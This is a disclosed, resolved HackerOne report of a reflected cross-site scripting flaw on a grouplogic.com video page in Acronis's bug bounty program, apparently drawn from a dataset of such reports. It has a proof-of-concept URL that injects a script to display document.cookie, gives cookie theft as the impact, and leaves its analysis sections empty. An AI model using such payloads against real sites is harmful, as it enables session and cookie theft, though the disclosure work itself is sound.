---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '859802'
original_report_id: '859802'
title: Reflected XSS on www.grouplogic.com/video.asp
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: acronis
created_at: '2020-04-26T17:29:49.056Z'
disclosed_at: '2021-04-13T13:23:49.531Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 64
asset_identifier: Other Acronis Domains
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on www.grouplogic.com/video.asp

## Metadata

- HackerOne Report ID: 859802
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: acronis
- Disclosed At: 2021-04-13T13:23:49.531Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello there,
I hope you are well!

PoC:
http://www.grouplogic.com/video.asp?v=Acroxx1%22%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Es_aE&e=mp4&width=560&height=315

## Impact

Stealing cookies

Best Regards,
@mygf

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
